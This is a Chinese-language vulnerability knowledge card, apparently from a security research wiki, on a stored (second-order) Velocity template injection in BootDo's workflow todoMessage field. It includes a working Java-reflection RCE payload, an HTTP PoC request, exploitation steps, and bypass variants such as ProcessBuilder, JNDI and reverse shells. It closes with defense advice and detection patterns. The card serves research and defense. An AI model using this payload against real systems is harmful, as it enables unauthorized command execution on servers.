---
id: web-generic-ssti-bootdo-velocity-todomessage
title: BootDo 工作流待办消息存储后经 VelocityUtils.RenderData 求值：二阶 Velocity 模板注入 RCE
type: scenario
domain: web
path: web/generic/ssti
technique: velocity-second-order-template-injection
tags:
- web
- ssti
- velocity
- java
- second-order
- stored
- workflow
- rce
- bootdo
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:00:54+08:00'
  notes: 已对照原文与26张图核对：CustomActivitiesController.update 的 @RequiresPermissions 被注释、todoMessage 原样入库、complete() 取 customActivitiesDao.getOne(...).getTodoMessage() 交 VelocityUtils.RenderData 求值、调试载荷与 calc 弹出，均与图22-26一致。已修正卡内'在 complete() 处观察到载荷'为'在 update() 处观察到'（图24 断点在 update）。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssti/web-generic-ssti-bootdo-velocity-todomessage/
draft: false
kb_aliases:
- BootDo Velocity 模板注入
- todoMessage 模板注入
- VelocityUtils.RenderData
- 二阶模板注入
- 工作流待办消息 RCE
---

## 一句话结论

BootDo 的工作流待办消息 `todoMessage` 先由 `/update` 接口写入 `act_custom_activities` 表，任务完成时 `complete()` 从表中取出该字段并交给 `VelocityUtils.RenderData(message, vars)` 求值；攻击者把 Velocity 表达式（如 `#set($b="")$b.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")`）存进待办消息，任务完成时即触发模板注入并执行系统命令。

## 原理

- 写入点：`CustomActivitiesController.update(CustomActivitiesDO customActivities)` 把请求体绑定到实体并 `customActivitiesService.update(...)`，其中 `todoMessage`（待办提醒文案）原样入库；审计截图中该方法的 `@RequiresPermissions("activiti:customActivities:edit")` 被注释掉，意味着任意登录用户可能都能调用。
- 触发点：工作流任务完成时，`complete(taskId, vars)` 计算后续任务节点，对每个新任务执行：
  - 用 `processDefinitionId` + `activityId` 调 `customActivitiesDao.getOne(...)` 查配置；
  - 取 `u.getTodoMessage()` 作为 `message`；
  - 调用 `VelocityUtils.RenderData(message, new HashMap(){{ put("taskName", task1.getName()); }})` 渲染。
- `RenderData` 内部使用 Velocity 引擎对 `message` 字符串做模板求值（全局搜索 `.evaluate` 可定位）。Velocity 允许 `#set` 定义变量、通过对象反射调用任意方法，因此 `$b.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")` 可以加载 `java.lang.Runtime` 并执行命令。
- 根因：把“数据库中存储的业务文案”当作可信模板，而不是普通文本；模板引擎的求值发生在任务完成的后台流程中，形成二阶（存储型）注入，输入点与触发点分离，常规请求参数检测很难发现。
- 注入点不在模板字符串本身，而在 `message` 的内容；`taskName` 等上下文变量只是渲染参数。只要攻击者能控制 `todoMessage` 并让某个任务完成，就能在服务端执行代码。

## 触发条件

- 目标为 BootDo（或使用相同 `VelocityUtils.RenderData` 模式的应用）。
- 攻击者能调用 `CustomActivitiesController` 的 `/update`（或 `save`）写入 `todoMessage`；审计版本中权限注解被注释，任意登录用户可能可写。
- 存在工作流任务完成流程，会执行 `complete()` 并渲染该 `todoMessage`。
- 目标使用 Velocity 引擎且未启用安全 Uberspector/沙箱（默认 Velocity 允许反射调用）。

## 利用步骤

1. 登录目标，定位自定义活动配置接口（如 `/activiti/customActivities/update`），确认可写入 `todoMessage`。
2. 提交包含 Velocity 载荷的 `todoMessage`，例如 `#set($b="")$b.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")`，其余字段按目标已有记录填写。
3. 触发工作流任务完成（审批/办理任务），使 `complete()` 查询到该配置并调用 `VelocityUtils.RenderData`。
4. 观察服务端执行结果（原文用 `calc` 弹计算器验证）；也可改为写文件、反弹 shell 或执行 `id`/`whoami` 回显。
5. 记录写入请求、任务完成请求与执行证据；验证后清理测试数据。

## PoC

写入待办消息：

```http
POST /activiti/customActivities/update HTTP/1.1
Host: target
Cookie: JSESSIONID=<登录会话>
Content-Type: application/json

{
  "id": 150,
  "todoMessage": "#set($b=\"\")$b.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc\")"
}
```

随后完成对应工作流任务（审批/办理），`complete()` 取到该 `todoMessage` 并渲染，服务端弹出计算器。原文通过动态调试在 `update()` 处观察到 `todoMessage` 变量即为上述载荷，并在任务完成后截图验证 `calc` 执行。

## 变体与关联

- 变体：`save` 新增自定义活动同样写入 `todo_message`，可作为另一条写入路径。
- 变体：`processDefinitionId`/`activityId` 组合决定命中哪条配置；攻击者可先枚举或新增配置，确保任务完成时命中自己的载荷。
- 变体：若目标禁用 `Runtime`，可尝试 `ProcessBuilder`、`ScriptEngine`、文件写入、JNDI 等 Velocity 可达的类；也可用 `$class.inspect(...)` 等语法绕过关键字检测。
- 关联：[[web-generic-ssti-fastcms-template-edit-freemarker-rce]]（模板内容可编辑导致 SSTI 的同类模式，本卡是 Velocity 且为二阶触发）。
- 关联：[[web-generic-ssti-engine-identification-decision-tree-errors]]（模板引擎识别与探测）。
- 关联：[[web-java-expression-spel-restricted-reflection-memshell]]（Java 表达式/模板反射执行链的同类利用）。

## 检测与防御

- 防御：不要把用户/数据库内容作为模板源码求值；待办消息应按普通文本插值（如占位符替换 `{taskName}`）而不是交给 Velocity `evaluate`。
- 防御：必须使用模板时，启用 Velocity 安全 Uberspector（`SecureUberspector`）并限制可访问类；对模板源码做白名单/转义，禁止 `#set`、`$class`、反射调用。
- 防御：`CustomActivitiesController` 恢复权限注解并做服务端授权校验；对 `todoMessage` 做内容校验与长度限制。
- 检测：审计 `VelocityUtils.RenderData`、`Velocity.evaluate`、`#set(`、`getClass().forName` 等模式；关注数据库 `act_custom_activities.todo_message` 中出现 `#set`、`$class`、`Runtime`、`ProcessBuilder` 等特征。
- 检测：任务完成时后台出现异常进程创建（calc、cmd、bash、curl 等）；应用日志出现 Velocity 解析异常或反射调用告警。
